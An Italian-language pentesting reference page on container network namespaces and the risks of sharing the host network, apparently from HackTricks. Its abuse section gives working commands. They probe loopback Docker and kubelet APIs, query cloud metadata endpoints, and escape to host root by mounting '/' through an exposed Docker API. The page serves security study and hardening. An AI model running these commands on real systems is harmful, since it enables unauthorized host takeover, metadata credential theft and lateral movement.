# Namespace di rete

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il network namespace isola risorse relative alla rete come interfacce, indirizzi IP, tabelle di routing, stato ARP/neighbor, regole del firewall, socket e il contenuto di file come `/proc/net`. Per questo un container può avere quello che sembra il proprio `eth0`, le proprie rotte locali e il proprio dispositivo loopback senza possedere lo stack di rete reale dell'host.

Dal punto di vista della sicurezza, questo conta perché network isolation riguarda molto più del semplice port binding. Un namespace di rete privato limita ciò che il workload può osservare o riconfigurare direttamente. Una volta che quel namespace viene condiviso con l'host, il container può improvvisamente ottenere visibilità sui host listeners, sui servizi host-local e sui punti di controllo di rete che non erano mai destinati a essere esposti all'applicazione.

## Funzionamento

Un network namespace appena creato inizia con un ambiente di rete vuoto o quasi vuoto fino a quando non gli vengono collegate delle interfacce. I container runtimes poi creano o connettono interfacce virtuali, assegnano indirizzi e configurano rotte in modo che il workload abbia la connettività prevista. Nelle implementazioni basate su bridge, questo di solito significa che il container vede un'interfaccia veth collegata a un bridge dell'host. In Kubernetes, i plugin CNI gestiscono la configurazione equivalente per il networking dei Pod.

Questa architettura spiega perché `--network=host` o `hostNetwork: true` rappresentino un cambiamento così drastico. Invece di ricevere uno stack di rete privato predisposto, il workload si unisce a quello reale dell'host.

## Laboratorio

Puoi vedere un namespace di rete quasi vuoto con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E puoi confrontare i container normali e i container host-networked con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Il container con host networking non ha più la propria vista isolata di socket e interfacce. Questo cambiamento da solo è già significativo prima ancora di chiedersi quali capability abbia il processo.

## Uso a runtime

Docker e Podman normalmente creano uno namespace di rete privato per ogni container a meno che non siano configurati diversamente. Kubernetes di solito assegna a ogni Pod il proprio namespace di rete, condiviso dai container all'interno di quel Pod ma separato dall'host. Anche i sistemi Incus/LXC offrono un'ampia isolazione basata sui network namespace, spesso con una maggiore varietà di configurazioni di networking virtuale.

Il principio comune è che il networking privato sia il confine di isolamento predefinito, mentre l'host networking è un opt-out esplicito da quel confine.

## Configurazioni errate

La configurazione errata più importante è semplicemente la condivisione del network namespace dell'host. Questo viene talvolta fatto per performance, monitoraggio a basso livello o comodità, ma elimina uno dei confini più netti disponibili per i container. I listener locali all'host diventano raggiungibili in modo più diretto, i servizi accessibili solo tramite localhost possono diventare raggiungibili, e capability come `CAP_NET_ADMIN` o `CAP_NET_RAW` diventano molto più pericolose perché le operazioni che abilitano vengono ora applicate all'ambiente di rete dell'host.

Un altro problema è concedere troppe capability legate alla rete anche quando il namespace di rete è privato. Un namespace privato aiuta, ma non rende innocui i raw socket o il controllo avanzato della rete.

In Kubernetes, `hostNetwork: true` cambia anche quanto puoi affidarti alla segmentazione di rete a livello di Pod. La documentazione di Kubernetes segnala che molti network plugin non riescono a distinguere correttamente il traffico dei Pod con `hostNetwork` per il matching di `podSelector` / `namespaceSelector` e quindi lo trattano come traffico ordinario del nodo. Dal punto di vista di un attaccante, ciò significa che un workload con `hostNetwork` compromesso dovrebbe spesso essere considerato un foothold di rete a livello di nodo piuttosto che un normale Pod ancora vincolato dalle stesse ipotesi di policy dei workload su overlay-network.

## Abuso

In ambienti poco isolati, un attaccante può ispezionare i servizi in ascolto sull'host, raggiungere endpoint di gestione legati solo al loopback, sniffare o interferire con il traffico a seconda delle capability e dell'ambiente, o riconfigurare routing e stato del firewall se è presente `CAP_NET_ADMIN`. In un cluster, questo può anche facilitare movimenti laterali e la ricognizione del control-plane.

Se sospetti l'uso della rete host, inizia confermando che le interfacce e i listener visibili appartengano all'host piuttosto che a una rete isolata del container:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
I servizi accessibili solo tramite loopback sono spesso la prima scoperta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Se sono presenti capacità di rete, verifica se il workload può ispezionare o modificare lo stack visibile:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Sui kernel moderni, il networking host insieme a `CAP_NET_ADMIN` può anche esporre il percorso dei pacchetti oltre alle semplici modifiche di `iptables` / `nftables`. Anche i qdiscs e i filtri di `tc` sono a livello di namespace, quindi in un namespace di rete host condiviso si applicano alle interfacce host che il container può vedere. Se è presente anche `CAP_BPF`, diventano rilevanti anche programmi eBPF correlati alla rete come i loader TC e XDP:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Questo è importante perché un attaccante potrebbe essere in grado di rispecchiare, reindirizzare, modellare o scartare il traffico a livello dell'interfaccia host, non solo di riscrivere le regole del firewall. In un network namespace privato queste azioni sono confinate alla vista del container; in un namespace host condiviso diventano impattanti per l'host.

Negli ambienti cluster o cloud, la rete dell'host giustifica inoltre una rapida ricognizione locale di metadati e servizi adiacenti al control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Esempio completo: Host Networking + Local Runtime / Kubelet Access

Host networking non fornisce automaticamente il root dell'host, ma spesso espone servizi che sono intenzionalmente raggiungibili solo dal nodo stesso. Se uno di questi servizi è debolmente protetto, host networking diventa un percorso diretto di privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet su localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impatto:

- compromissione diretta dell'host se un'API runtime locale è esposta senza adeguata protezione
- ricognizione del cluster o movimento laterale se kubelet o agent locali sono raggiungibili
- manipolazione del traffico o denial of service quando combinato con `CAP_NET_ADMIN`

## Verifiche

L'obiettivo di queste verifiche è capire se il processo dispone di uno stack di rete privato, quali rotte e listener sono visibili, e se la vista di rete appare già simile a quella dell'host prima ancora di testare le capability.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
What is interesting here:

- Se `/proc/self/ns/net` e `/proc/1/ns/net` appaiono già simili a quelli dell'host, il container potrebbe condividere il network namespace dell'host o un altro namespace non privato.
- `lsns -t net` e `ip netns identify` sono utili quando la shell è già all'interno di un namespace nominato o persistente e vuoi correlare questo con gli oggetti `/run/netns` dal lato host.
- `ss -lntup` è particolarmente utile perché rivela listener solo su loopback e endpoint di gestione locali.
- Rotte, nomi delle interfacce, contesto del firewall, stato di `tc` e le associazioni eBPF diventano molto più importanti se sono presenti `CAP_NET_ADMIN`, `CAP_NET_RAW` o `CAP_BPF`.
- In Kubernetes, la mancata risoluzione del nome del service da un Pod con `hostNetwork` può semplicemente significare che il Pod non sta usando `dnsPolicy: ClusterFirstWithHostNet`, non che il service sia assente.

Quando esamini un container, valuta sempre il network namespace insieme all'insieme di capability. Il networking host combinato a capacità di rete elevate è una postura molto diversa rispetto al networking bridge con un set di capability predefinite ristretto.

## Riferimenti

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
